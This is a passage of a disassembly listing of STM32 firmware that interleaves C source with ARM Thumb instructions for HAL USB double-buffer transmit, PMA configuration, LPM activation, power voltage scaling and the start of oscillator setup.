        /* Calculate the len of the new buffer to fill */
        if (ep->xfer_len_db >= ep->maxpacket)
 80034f8:	68bb      	ldr	r3, [r7, #8]
 80034fa:	6a1a      	ldr	r2, [r3, #32]
 80034fc:	68bb      	ldr	r3, [r7, #8]
 80034fe:	691b      	ldr	r3, [r3, #16]
 8003500:	429a      	cmp	r2, r3
 8003502:	d30b      	bcc.n	800351c <HAL_PCD_EP_DB_Transmit+0x63e>
        {
          len = ep->maxpacket;
 8003504:	68bb      	ldr	r3, [r7, #8]
 8003506:	691b      	ldr	r3, [r3, #16]
 8003508:	f8c7 308c 	str.w	r3, [r7, #140]	; 0x8c
          ep->xfer_len_db -= len;
 800350c:	68bb      	ldr	r3, [r7, #8]
 800350e:	6a1a      	ldr	r2, [r3, #32]
 8003510:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8003514:	1ad2      	subs	r2, r2, r3
 8003516:	68bb      	ldr	r3, [r7, #8]
 8003518:	621a      	str	r2, [r3, #32]
 800351a:	e017      	b.n	800354c <HAL_PCD_EP_DB_Transmit+0x66e>
        }
        else if (ep->xfer_len_db == 0U)
 800351c:	68bb      	ldr	r3, [r7, #8]
 800351e:	6a1b      	ldr	r3, [r3, #32]
 8003520:	2b00      	cmp	r3, #0
 8003522:	d108      	bne.n	8003536 <HAL_PCD_EP_DB_Transmit+0x658>
        {
          len = TxPctSize;
 8003524:	f8b7 3086 	ldrh.w	r3, [r7, #134]	; 0x86
 8003528:	f8c7 308c 	str.w	r3, [r7, #140]	; 0x8c
          ep->xfer_fill_db = 0U;
 800352c:	68bb      	ldr	r3, [r7, #8]
 800352e:	2200      	movs	r2, #0
 8003530:	f883 2024 	strb.w	r2, [r3, #36]	; 0x24
 8003534:	e00a      	b.n	800354c <HAL_PCD_EP_DB_Transmit+0x66e>
        }
        else
        {
          len = ep->xfer_len_db;
 8003536:	68bb      	ldr	r3, [r7, #8]
 8003538:	6a1b      	ldr	r3, [r3, #32]
 800353a:	f8c7 308c 	str.w	r3, [r7, #140]	; 0x8c
          ep->xfer_len_db = 0U;
 800353e:	68bb      	ldr	r3, [r7, #8]
 8003540:	2200      	movs	r2, #0
 8003542:	621a      	str	r2, [r3, #32]
          ep->xfer_fill_db = 0;
 8003544:	68bb      	ldr	r3, [r7, #8]
 8003546:	2200      	movs	r2, #0
 8003548:	f883 2024 	strb.w	r2, [r3, #36]	; 0x24
        }

        /* Set the Double buffer counter for pmabuffer1 */
        PCD_SET_EP_DBUF1_CNT(hpcd->Instance, ep->num, ep->is_in, len);
 800354c:	68fb      	ldr	r3, [r7, #12]
 800354e:	681b      	ldr	r3, [r3, #0]
 8003550:	657b      	str	r3, [r7, #84]	; 0x54
 8003552:	68bb      	ldr	r3, [r7, #8]
 8003554:	785b      	ldrb	r3, [r3, #1]
 8003556:	2b00      	cmp	r3, #0
 8003558:	d165      	bne.n	8003626 <HAL_PCD_EP_DB_Transmit+0x748>
 800355a:	68fb      	ldr	r3, [r7, #12]
 800355c:	681b      	ldr	r3, [r3, #0]
 800355e:	65fb      	str	r3, [r7, #92]	; 0x5c
 8003560:	68fb      	ldr	r3, [r7, #12]
 8003562:	681b      	ldr	r3, [r3, #0]
 8003564:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8003568:	b29b      	uxth	r3, r3
 800356a:	461a      	mov	r2, r3
 800356c:	6dfb      	ldr	r3, [r7, #92]	; 0x5c
 800356e:	4413      	add	r3, r2
 8003570:	65fb      	str	r3, [r7, #92]	; 0x5c
 8003572:	68bb      	ldr	r3, [r7, #8]
 8003574:	781b      	ldrb	r3, [r3, #0]
 8003576:	00da      	lsls	r2, r3, #3
 8003578:	6dfb      	ldr	r3, [r7, #92]	; 0x5c
 800357a:	4413      	add	r3, r2
 800357c:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8003580:	65bb      	str	r3, [r7, #88]	; 0x58
 8003582:	6dbb      	ldr	r3, [r7, #88]	; 0x58
 8003584:	881b      	ldrh	r3, [r3, #0]
 8003586:	b29b      	uxth	r3, r3
 8003588:	f3c3 0309 	ubfx	r3, r3, #0, #10
 800358c:	b29a      	uxth	r2, r3
 800358e:	6dbb      	ldr	r3, [r7, #88]	; 0x58
 8003590:	801a      	strh	r2, [r3, #0]
 8003592:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8003596:	2b3e      	cmp	r3, #62	; 0x3e
 8003598:	d91d      	bls.n	80035d6 <HAL_PCD_EP_DB_Transmit+0x6f8>
 800359a:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 800359e:	095b      	lsrs	r3, r3, #5
 80035a0:	66bb      	str	r3, [r7, #104]	; 0x68
 80035a2:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 80035a6:	f003 031f 	and.w	r3, r3, #31
 80035aa:	2b00      	cmp	r3, #0
 80035ac:	d102      	bne.n	80035b4 <HAL_PCD_EP_DB_Transmit+0x6d6>
 80035ae:	6ebb      	ldr	r3, [r7, #104]	; 0x68
 80035b0:	3b01      	subs	r3, #1
 80035b2:	66bb      	str	r3, [r7, #104]	; 0x68
 80035b4:	6dbb      	ldr	r3, [r7, #88]	; 0x58
 80035b6:	881b      	ldrh	r3, [r3, #0]
 80035b8:	b29a      	uxth	r2, r3
 80035ba:	6ebb      	ldr	r3, [r7, #104]	; 0x68
 80035bc:	b29b      	uxth	r3, r3
 80035be:	029b      	lsls	r3, r3, #10
 80035c0:	b29b      	uxth	r3, r3
 80035c2:	4313      	orrs	r3, r2
 80035c4:	b29b      	uxth	r3, r3
 80035c6:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 80035ca:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 80035ce:	b29a      	uxth	r2, r3
 80035d0:	6dbb      	ldr	r3, [r7, #88]	; 0x58
 80035d2:	801a      	strh	r2, [r3, #0]
 80035d4:	e041      	b.n	800365a <HAL_PCD_EP_DB_Transmit+0x77c>
 80035d6:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 80035da:	2b00      	cmp	r3, #0
 80035dc:	d10a      	bne.n	80035f4 <HAL_PCD_EP_DB_Transmit+0x716>
 80035de:	6dbb      	ldr	r3, [r7, #88]	; 0x58
 80035e0:	881b      	ldrh	r3, [r3, #0]
 80035e2:	b29b      	uxth	r3, r3
 80035e4:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 80035e8:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 80035ec:	b29a      	uxth	r2, r3
 80035ee:	6dbb      	ldr	r3, [r7, #88]	; 0x58
 80035f0:	801a      	strh	r2, [r3, #0]
 80035f2:	e032      	b.n	800365a <HAL_PCD_EP_DB_Transmit+0x77c>
 80035f4:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 80035f8:	085b      	lsrs	r3, r3, #1
 80035fa:	66bb      	str	r3, [r7, #104]	; 0x68
 80035fc:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8003600:	f003 0301 	and.w	r3, r3, #1
 8003604:	2b00      	cmp	r3, #0
 8003606:	d002      	beq.n	800360e <HAL_PCD_EP_DB_Transmit+0x730>
 8003608:	6ebb      	ldr	r3, [r7, #104]	; 0x68
 800360a:	3301      	adds	r3, #1
 800360c:	66bb      	str	r3, [r7, #104]	; 0x68
 800360e:	6dbb      	ldr	r3, [r7, #88]	; 0x58
 8003610:	881b      	ldrh	r3, [r3, #0]
 8003612:	b29a      	uxth	r2, r3
 8003614:	6ebb      	ldr	r3, [r7, #104]	; 0x68
 8003616:	b29b      	uxth	r3, r3
 8003618:	029b      	lsls	r3, r3, #10
 800361a:	b29b      	uxth	r3, r3
 800361c:	4313      	orrs	r3, r2
 800361e:	b29a      	uxth	r2, r3
 8003620:	6dbb      	ldr	r3, [r7, #88]	; 0x58
 8003622:	801a      	strh	r2, [r3, #0]
 8003624:	e019      	b.n	800365a <HAL_PCD_EP_DB_Transmit+0x77c>
 8003626:	68bb      	ldr	r3, [r7, #8]
 8003628:	785b      	ldrb	r3, [r3, #1]
 800362a:	2b01      	cmp	r3, #1
 800362c:	d115      	bne.n	800365a <HAL_PCD_EP_DB_Transmit+0x77c>
 800362e:	68fb      	ldr	r3, [r7, #12]
 8003630:	681b      	ldr	r3, [r3, #0]
 8003632:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8003636:	b29b      	uxth	r3, r3
 8003638:	461a      	mov	r2, r3
 800363a:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 800363c:	4413      	add	r3, r2
 800363e:	657b      	str	r3, [r7, #84]	; 0x54
 8003640:	68bb      	ldr	r3, [r7, #8]
 8003642:	781b      	ldrb	r3, [r3, #0]
 8003644:	00da      	lsls	r2, r3, #3
 8003646:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8003648:	4413      	add	r3, r2
 800364a:	f203 4306 	addw	r3, r3, #1030	; 0x406
 800364e:	653b      	str	r3, [r7, #80]	; 0x50
 8003650:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8003654:	b29a      	uxth	r2, r3
 8003656:	6d3b      	ldr	r3, [r7, #80]	; 0x50
 8003658:	801a      	strh	r2, [r3, #0]

        /* Copy the user buffer to USB PMA */
        USB_WritePMA(hpcd->Instance, ep->xfer_buff,  ep->pmaaddr1, (uint16_t)len);
 800365a:	68fb      	ldr	r3, [r7, #12]
 800365c:	6818      	ldr	r0, [r3, #0]
 800365e:	68bb      	ldr	r3, [r7, #8]
 8003660:	6959      	ldr	r1, [r3, #20]
 8003662:	68bb      	ldr	r3, [r7, #8]
 8003664:	895a      	ldrh	r2, [r3, #10]
 8003666:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 800366a:	b29b      	uxth	r3, r3
 800366c:	f004 fee7 	bl	800843e <USB_WritePMA>
      }
    }
  }

  /*enable endpoint IN*/
  PCD_SET_EP_TX_STATUS(hpcd->Instance, ep->num, USB_EP_TX_VALID);
 8003670:	68fb      	ldr	r3, [r7, #12]
 8003672:	681b      	ldr	r3, [r3, #0]
 8003674:	461a      	mov	r2, r3
 8003676:	68bb      	ldr	r3, [r7, #8]
 8003678:	781b      	ldrb	r3, [r3, #0]
 800367a:	009b      	lsls	r3, r3, #2
 800367c:	4413      	add	r3, r2
 800367e:	881b      	ldrh	r3, [r3, #0]
 8003680:	b29b      	uxth	r3, r3
 8003682:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8003686:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 800368a:	82bb      	strh	r3, [r7, #20]
 800368c:	8abb      	ldrh	r3, [r7, #20]
 800368e:	f083 0310 	eor.w	r3, r3, #16
 8003692:	82bb      	strh	r3, [r7, #20]
 8003694:	8abb      	ldrh	r3, [r7, #20]
 8003696:	f083 0320 	eor.w	r3, r3, #32
 800369a:	82bb      	strh	r3, [r7, #20]
 800369c:	68fb      	ldr	r3, [r7, #12]
 800369e:	681b      	ldr	r3, [r3, #0]
 80036a0:	461a      	mov	r2, r3
 80036a2:	68bb      	ldr	r3, [r7, #8]
 80036a4:	781b      	ldrb	r3, [r3, #0]
 80036a6:	009b      	lsls	r3, r3, #2
 80036a8:	441a      	add	r2, r3
 80036aa:	8abb      	ldrh	r3, [r7, #20]
 80036ac:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80036b0:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80036b4:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80036b8:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80036bc:	b29b      	uxth	r3, r3
 80036be:	8013      	strh	r3, [r2, #0]

  return HAL_OK;
 80036c0:	2300      	movs	r3, #0
}
 80036c2:	4618      	mov	r0, r3
 80036c4:	3790      	adds	r7, #144	; 0x90
 80036c6:	46bd      	mov	sp, r7
 80036c8:	bd80      	pop	{r7, pc}

080036ca <HAL_PCDEx_PMAConfig>:
  * @retval HAL status
  */

HAL_StatusTypeDef  HAL_PCDEx_PMAConfig(PCD_HandleTypeDef *hpcd, uint16_t ep_addr,
                                       uint16_t ep_kind, uint32_t pmaadress)
{
 80036ca:	b480      	push	{r7}
 80036cc:	b087      	sub	sp, #28
 80036ce:	af00      	add	r7, sp, #0
 80036d0:	60f8      	str	r0, [r7, #12]
 80036d2:	607b      	str	r3, [r7, #4]
 80036d4:	460b      	mov	r3, r1
 80036d6:	817b      	strh	r3, [r7, #10]
 80036d8:	4613      	mov	r3, r2
 80036da:	813b      	strh	r3, [r7, #8]
  PCD_EPTypeDef *ep;

  /* initialize ep structure*/
  if ((0x80U & ep_addr) == 0x80U)
 80036dc:	897b      	ldrh	r3, [r7, #10]
 80036de:	f003 0380 	and.w	r3, r3, #128	; 0x80
 80036e2:	b29b      	uxth	r3, r3
 80036e4:	2b00      	cmp	r3, #0
 80036e6:	d00b      	beq.n	8003700 <HAL_PCDEx_PMAConfig+0x36>
  {
    ep = &hpcd->IN_ep[ep_addr & EP_ADDR_MSK];
 80036e8:	897b      	ldrh	r3, [r7, #10]
 80036ea:	f003 0307 	and.w	r3, r3, #7
 80036ee:	1c5a      	adds	r2, r3, #1
 80036f0:	4613      	mov	r3, r2
 80036f2:	009b      	lsls	r3, r3, #2
 80036f4:	4413      	add	r3, r2
 80036f6:	00db      	lsls	r3, r3, #3
 80036f8:	68fa      	ldr	r2, [r7, #12]
 80036fa:	4413      	add	r3, r2
 80036fc:	617b      	str	r3, [r7, #20]
 80036fe:	e009      	b.n	8003714 <HAL_PCDEx_PMAConfig+0x4a>
  }
  else
  {
    ep = &hpcd->OUT_ep[ep_addr];
 8003700:	897a      	ldrh	r2, [r7, #10]
 8003702:	4613      	mov	r3, r2
 8003704:	009b      	lsls	r3, r3, #2
 8003706:	4413      	add	r3, r2
 8003708:	00db      	lsls	r3, r3, #3
 800370a:	f503 73b4 	add.w	r3, r3, #360	; 0x168
 800370e:	68fa      	ldr	r2, [r7, #12]
 8003710:	4413      	add	r3, r2
 8003712:	617b      	str	r3, [r7, #20]
  }

  /* Here we check if the endpoint is single or double Buffer*/
  if (ep_kind == PCD_SNG_BUF)
 8003714:	893b      	ldrh	r3, [r7, #8]
 8003716:	2b00      	cmp	r3, #0
 8003718:	d107      	bne.n	800372a <HAL_PCDEx_PMAConfig+0x60>
  {
    /* Single Buffer */
    ep->doublebuffer = 0U;
 800371a:	697b      	ldr	r3, [r7, #20]
 800371c:	2200      	movs	r2, #0
 800371e:	731a      	strb	r2, [r3, #12]
    /* Configure the PMA */
    ep->pmaadress = (uint16_t)pmaadress;
 8003720:	687b      	ldr	r3, [r7, #4]
 8003722:	b29a      	uxth	r2, r3
 8003724:	697b      	ldr	r3, [r7, #20]
 8003726:	80da      	strh	r2, [r3, #6]
 8003728:	e00b      	b.n	8003742 <HAL_PCDEx_PMAConfig+0x78>
  }
#if (USE_USB_DOUBLE_BUFFER == 1U)
  else /* USB_DBL_BUF */
  {
    /* Double Buffer Endpoint */
    ep->doublebuffer = 1U;
 800372a:	697b      	ldr	r3, [r7, #20]
 800372c:	2201      	movs	r2, #1
 800372e:	731a      	strb	r2, [r3, #12]
    /* Configure the PMA */
    ep->pmaaddr0 = (uint16_t)(pmaadress & 0xFFFFU);
 8003730:	687b      	ldr	r3, [r7, #4]
 8003732:	b29a      	uxth	r2, r3
 8003734:	697b      	ldr	r3, [r7, #20]
 8003736:	811a      	strh	r2, [r3, #8]
    ep->pmaaddr1 = (uint16_t)((pmaadress & 0xFFFF0000U) >> 16);
 8003738:	687b      	ldr	r3, [r7, #4]
 800373a:	0c1b      	lsrs	r3, r3, #16
 800373c:	b29a      	uxth	r2, r3
 800373e:	697b      	ldr	r3, [r7, #20]
 8003740:	815a      	strh	r2, [r3, #10]
  }
#endif /* (USE_USB_DOUBLE_BUFFER == 1U) */

  return HAL_OK;
 8003742:	2300      	movs	r3, #0
}
 8003744:	4618      	mov	r0, r3
 8003746:	371c      	adds	r7, #28
 8003748:	46bd      	mov	sp, r7
 800374a:	f85d 7b04 	ldr.w	r7, [sp], #4
 800374e:	4770      	bx	lr

08003750 <HAL_PCDEx_ActivateLPM>:
  * @brief  Activate LPM feature.
  * @param  hpcd PCD handle
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_PCDEx_ActivateLPM(PCD_HandleTypeDef *hpcd)
{
 8003750:	b480      	push	{r7}
 8003752:	b085      	sub	sp, #20
 8003754:	af00      	add	r7, sp, #0
 8003756:	6078      	str	r0, [r7, #4]

  USB_TypeDef *USBx = hpcd->Instance;
 8003758:	687b      	ldr	r3, [r7, #4]
 800375a:	681b      	ldr	r3, [r3, #0]
 800375c:	60fb      	str	r3, [r7, #12]
  hpcd->lpm_active = 1U;
 800375e:	687b      	ldr	r3, [r7, #4]
 8003760:	2201      	movs	r2, #1
 8003762:	f8c3 22ec 	str.w	r2, [r3, #748]	; 0x2ec
  hpcd->LPM_State = LPM_L0;
 8003766:	687b      	ldr	r3, [r7, #4]
 8003768:	2200      	movs	r2, #0
 800376a:	f883 22e0 	strb.w	r2, [r3, #736]	; 0x2e0

  USBx->LPMCSR |= USB_LPMCSR_LMPEN;
 800376e:	68fb      	ldr	r3, [r7, #12]
 8003770:	f8b3 3054 	ldrh.w	r3, [r3, #84]	; 0x54
 8003774:	b29b      	uxth	r3, r3
 8003776:	f043 0301 	orr.w	r3, r3, #1
 800377a:	b29a      	uxth	r2, r3
 800377c:	68fb      	ldr	r3, [r7, #12]
 800377e:	f8a3 2054 	strh.w	r2, [r3, #84]	; 0x54
  USBx->LPMCSR |= USB_LPMCSR_LPMACK;
 8003782:	68fb      	ldr	r3, [r7, #12]
 8003784:	f8b3 3054 	ldrh.w	r3, [r3, #84]	; 0x54
 8003788:	b29b      	uxth	r3, r3
 800378a:	f043 0302 	orr.w	r3, r3, #2
 800378e:	b29a      	uxth	r2, r3
 8003790:	68fb      	ldr	r3, [r7, #12]
 8003792:	f8a3 2054 	strh.w	r2, [r3, #84]	; 0x54

  return HAL_OK;
 8003796:	2300      	movs	r3, #0
}
 8003798:	4618      	mov	r0, r3
 800379a:	3714      	adds	r7, #20
 800379c:	46bd      	mov	sp, r7
 800379e:	f85d 7b04 	ldr.w	r7, [sp], #4
 80037a2:	4770      	bx	lr

080037a4 <HAL_PWR_EnableBkUpAccess>:
  * @note  LSEON bit that switches on and off the LSE crystal belongs as well to the
  *        back-up domain.
  * @retval None
  */
void HAL_PWR_EnableBkUpAccess(void)
{
 80037a4:	b480      	push	{r7}
 80037a6:	af00      	add	r7, sp, #0
  SET_BIT(PWR->CR1, PWR_CR1_DBP);
 80037a8:	4b05      	ldr	r3, [pc, #20]	; (80037c0 <HAL_PWR_EnableBkUpAccess+0x1c>)
 80037aa:	681b      	ldr	r3, [r3, #0]
 80037ac:	4a04      	ldr	r2, [pc, #16]	; (80037c0 <HAL_PWR_EnableBkUpAccess+0x1c>)
 80037ae:	f443 7380 	orr.w	r3, r3, #256	; 0x100
 80037b2:	6013      	str	r3, [r2, #0]
}
 80037b4:	bf00      	nop
 80037b6:	46bd      	mov	sp, r7
 80037b8:	f85d 7b04 	ldr.w	r7, [sp], #4
 80037bc:	4770      	bx	lr
 80037be:	bf00      	nop
 80037c0:	40007000 	.word	0x40007000

080037c4 <HAL_PWREx_GetVoltageRange>:
  * @brief Return Voltage Scaling Range.
  * @retval VOS bit field (PWR_REGULATOR_VOLTAGE_SCALE1 or PWR_REGULATOR_VOLTAGE_SCALE2
  *         or PWR_REGULATOR_VOLTAGE_SCALE1_BOOST when applicable)
  */
uint32_t HAL_PWREx_GetVoltageRange(void)
{
 80037c4:	b480      	push	{r7}
 80037c6:	af00      	add	r7, sp, #0
    else
    {
      return PWR_REGULATOR_VOLTAGE_SCALE1_BOOST;
    }
#else
  return  (PWR->CR1 & PWR_CR1_VOS);
 80037c8:	4b04      	ldr	r3, [pc, #16]	; (80037dc <HAL_PWREx_GetVoltageRange+0x18>)
 80037ca:	681b      	ldr	r3, [r3, #0]
 80037cc:	f403 63c0 	and.w	r3, r3, #1536	; 0x600
#endif
}
 80037d0:	4618      	mov	r0, r3
 80037d2:	46bd      	mov	sp, r7
 80037d4:	f85d 7b04 	ldr.w	r7, [sp], #4
 80037d8:	4770      	bx	lr
 80037da:	bf00      	nop
 80037dc:	40007000 	.word	0x40007000

080037e0 <HAL_PWREx_ControlVoltageScaling>:
  *        cleared before returning the status. If the flag is not cleared within
  *        50 microseconds, HAL_TIMEOUT status is reported.
  * @retval HAL Status
  */
HAL_StatusTypeDef HAL_PWREx_ControlVoltageScaling(uint32_t VoltageScaling)
{
 80037e0:	b480      	push	{r7}
 80037e2:	b085      	sub	sp, #20
 80037e4:	af00      	add	r7, sp, #0
 80037e6:	6078      	str	r0, [r7, #4]
  }

#else

  /* If Set Range 1 */
  if (VoltageScaling == PWR_REGULATOR_VOLTAGE_SCALE1)
 80037e8:	687b      	ldr	r3, [r7, #4]
 80037ea:	f5b3 7f00 	cmp.w	r3, #512	; 0x200
 80037ee:	d130      	bne.n	8003852 <HAL_PWREx_ControlVoltageScaling+0x72>
  {
    if (READ_BIT(PWR->CR1, PWR_CR1_VOS) != PWR_REGULATOR_VOLTAGE_SCALE1)
 80037f0:	4b23      	ldr	r3, [pc, #140]	; (8003880 <HAL_PWREx_ControlVoltageScaling+0xa0>)
 80037f2:	681b      	ldr	r3, [r3, #0]
 80037f4:	f403 63c0 	and.w	r3, r3, #1536	; 0x600
 80037f8:	f5b3 7f00 	cmp.w	r3, #512	; 0x200
 80037fc:	d038      	beq.n	8003870 <HAL_PWREx_ControlVoltageScaling+0x90>
    {
      /* Set Range 1 */
      MODIFY_REG(PWR->CR1, PWR_CR1_VOS, PWR_REGULATOR_VOLTAGE_SCALE1);
 80037fe:	4b20      	ldr	r3, [pc, #128]	; (8003880 <HAL_PWREx_ControlVoltageScaling+0xa0>)
 8003800:	681b      	ldr	r3, [r3, #0]
 8003802:	f423 63c0 	bic.w	r3, r3, #1536	; 0x600
 8003806:	4a1e      	ldr	r2, [pc, #120]	; (8003880 <HAL_PWREx_ControlVoltageScaling+0xa0>)
 8003808:	f443 7300 	orr.w	r3, r3, #512	; 0x200
 800380c:	6013      	str	r3, [r2, #0]

      /* Wait until VOSF is cleared */
      wait_loop_index = ((PWR_FLAG_SETTING_DELAY_US * SystemCoreClock) / 1000000U) + 1U;
 800380e:	4b1d      	ldr	r3, [pc, #116]	; (8003884 <HAL_PWREx_ControlVoltageScaling+0xa4>)
 8003810:	681b      	ldr	r3, [r3, #0]
 8003812:	2232      	movs	r2, #50	; 0x32
 8003814:	fb02 f303 	mul.w	r3, r2, r3
 8003818:	4a1b      	ldr	r2, [pc, #108]	; (8003888 <HAL_PWREx_ControlVoltageScaling+0xa8>)
 800381a:	fba2 2303 	umull	r2, r3, r2, r3
 800381e:	0c9b      	lsrs	r3, r3, #18
 8003820:	3301      	adds	r3, #1
 8003822:	60fb      	str	r3, [r7, #12]
      while ((HAL_IS_BIT_SET(PWR->SR2, PWR_SR2_VOSF)) && (wait_loop_index != 0U))
 8003824:	e002      	b.n	800382c <HAL_PWREx_ControlVoltageScaling+0x4c>
      {
        wait_loop_index--;
 8003826:	68fb      	ldr	r3, [r7, #12]
 8003828:	3b01      	subs	r3, #1
 800382a:	60fb      	str	r3, [r7, #12]
      while ((HAL_IS_BIT_SET(PWR->SR2, PWR_SR2_VOSF)) && (wait_loop_index != 0U))
 800382c:	4b14      	ldr	r3, [pc, #80]	; (8003880 <HAL_PWREx_ControlVoltageScaling+0xa0>)
 800382e:	695b      	ldr	r3, [r3, #20]
 8003830:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 8003834:	f5b3 6f80 	cmp.w	r3, #1024	; 0x400
 8003838:	d102      	bne.n	8003840 <HAL_PWREx_ControlVoltageScaling+0x60>
 800383a:	68fb      	ldr	r3, [r7, #12]
 800383c:	2b00      	cmp	r3, #0
 800383e:	d1f2      	bne.n	8003826 <HAL_PWREx_ControlVoltageScaling+0x46>
      }
      if (HAL_IS_BIT_SET(PWR->SR2, PWR_SR2_VOSF))
 8003840:	4b0f      	ldr	r3, [pc, #60]	; (8003880 <HAL_PWREx_ControlVoltageScaling+0xa0>)
 8003842:	695b      	ldr	r3, [r3, #20]
 8003844:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 8003848:	f5b3 6f80 	cmp.w	r3, #1024	; 0x400
 800384c:	d110      	bne.n	8003870 <HAL_PWREx_ControlVoltageScaling+0x90>
      {
        return HAL_TIMEOUT;
 800384e:	2303      	movs	r3, #3
 8003850:	e00f      	b.n	8003872 <HAL_PWREx_ControlVoltageScaling+0x92>
      }
    }
  }
  else
  {
    if (READ_BIT(PWR->CR1, PWR_CR1_VOS) != PWR_REGULATOR_VOLTAGE_SCALE2)
 8003852:	4b0b      	ldr	r3, [pc, #44]	; (8003880 <HAL_PWREx_ControlVoltageScaling+0xa0>)
 8003854:	681b      	ldr	r3, [r3, #0]
 8003856:	f403 63c0 	and.w	r3, r3, #1536	; 0x600
 800385a:	f5b3 6f80 	cmp.w	r3, #1024	; 0x400
 800385e:	d007      	beq.n	8003870 <HAL_PWREx_ControlVoltageScaling+0x90>
    {
      /* Set Range 2 */
      MODIFY_REG(PWR->CR1, PWR_CR1_VOS, PWR_REGULATOR_VOLTAGE_SCALE2);
 8003860:	4b07      	ldr	r3, [pc, #28]	; (8003880 <HAL_PWREx_ControlVoltageScaling+0xa0>)
 8003862:	681b      	ldr	r3, [r3, #0]
 8003864:	f423 63c0 	bic.w	r3, r3, #1536	; 0x600
 8003868:	4a05      	ldr	r2, [pc, #20]	; (8003880 <HAL_PWREx_ControlVoltageScaling+0xa0>)
 800386a:	f443 6380 	orr.w	r3, r3, #1024	; 0x400
 800386e:	6013      	str	r3, [r2, #0]
      /* No need to wait for VOSF to be cleared for this transition */
    }
  }
#endif

  return HAL_OK;
 8003870:	2300      	movs	r3, #0
}
 8003872:	4618      	mov	r0, r3
 8003874:	3714      	adds	r7, #20
 8003876:	46bd      	mov	sp, r7
 8003878:	f85d 7b04 	ldr.w	r7, [sp], #4
 800387c:	4770      	bx	lr
 800387e:	bf00      	nop
 8003880:	40007000 	.word	0x40007000
 8003884:	20000000 	.word	0x20000000
 8003888:	431bde83 	.word	0x431bde83

0800388c <HAL_PWREx_EnableVddUSB>:
  * @brief Enable VDDUSB supply.
  * @note  Remove VDDUSB electrical and logical isolation, once VDDUSB supply is present.
  * @retval None
  */
void HAL_PWREx_EnableVddUSB(void)
{
 800388c:	b480      	push	{r7}
 800388e:	af00      	add	r7, sp, #0
  SET_BIT(PWR->CR2, PWR_CR2_USV);
 8003890:	4b05      	ldr	r3, [pc, #20]	; (80038a8 <HAL_PWREx_EnableVddUSB+0x1c>)
 8003892:	685b      	ldr	r3, [r3, #4]
 8003894:	4a04      	ldr	r2, [pc, #16]	; (80038a8 <HAL_PWREx_EnableVddUSB+0x1c>)
 8003896:	f443 6380 	orr.w	r3, r3, #1024	; 0x400
 800389a:	6053      	str	r3, [r2, #4]
}
 800389c:	bf00      	nop
 800389e:	46bd      	mov	sp, r7
 80038a0:	f85d 7b04 	ldr.w	r7, [sp], #4
 80038a4:	4770      	bx	lr
 80038a6:	bf00      	nop
 80038a8:	40007000 	.word	0x40007000

080038ac <HAL_RCC_OscConfig>:
  * @note   If HSE failed to start, HSE should be disabled before recalling
            HAL_RCC_OscConfig().
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_RCC_OscConfig(RCC_OscInitTypeDef  *RCC_OscInitStruct)
{
 80038ac:	b580      	push	{r7, lr}
 80038ae:	b088      	sub	sp, #32
 80038b0:	af00      	add	r7, sp, #0
 80038b2:	6078      	str	r0, [r7, #4]
  uint32_t tickstart;
  HAL_StatusTypeDef status;
  uint32_t sysclk_source, pll_config;

  /* Check Null pointer */
  if(RCC_OscInitStruct == NULL)
 80038b4:	687b      	ldr	r3, [r7, #4]
 80038b6:	2b00      	cmp	r3, #0
 80038b8:	d102      	bne.n	80038c0 <HAL_RCC_OscConfig+0x14>
  {
    return HAL_ERROR;
 80038ba:	2301      	movs	r3, #1
 80038bc:	f000 bc02 	b.w	80040c4 <HAL_RCC_OscConfig+0x818>
  }

  /* Check the parameters */
  assert_param(IS_RCC_OSCILLATORTYPE(RCC_OscInitStruct->OscillatorType));

  sysclk_source = __HAL_RCC_GET_SYSCLK_SOURCE();
 80038c0:	4b96      	ldr	r3, [pc, #600]	; (8003b1c <HAL_RCC_OscConfig+0x270>)
 80038c2:	689b      	ldr	r3, [r3, #8]
 80038c4:	f003 030c 	and.w	r3, r3, #12
 80038c8:	61bb      	str	r3, [r7, #24]
  pll_config = __HAL_RCC_GET_PLL_OSCSOURCE();
 80038ca:	4b94      	ldr	r3, [pc, #592]	; (8003b1c <HAL_RCC_OscConfig+0x270>)
 80038cc:	68db      	ldr	r3, [r3, #12]
 80038ce:	f003 0303 	and.w	r3, r3, #3
 80038d2:	617b      	str	r3, [r7, #20]

  /*----------------------------- MSI Configuration --------------------------*/
  if(((RCC_OscInitStruct->OscillatorType) & RCC_OSCILLATORTYPE_MSI) == RCC_OSCILLATORTYPE_MSI)
 80038d4:	687b      	ldr	r3, [r7, #4]
 80038d6:	681b      	ldr	r3, [r3, #0]
 80038d8:	f003 0310 	and.w	r3, r3, #16
 80038dc:	2b00      	cmp	r3, #0
 80038de:	f000 80e4 	beq.w	8003aaa <HAL_RCC_OscConfig+0x1fe>
    assert_param(IS_RCC_MSI(RCC_OscInitStruct->MSIState));
    assert_param(IS_RCC_MSICALIBRATION_VALUE(RCC_OscInitStruct->MSICalibrationValue));
    assert_param(IS_RCC_MSI_CLOCK_RANGE(RCC_OscInitStruct->MSIClockRange));

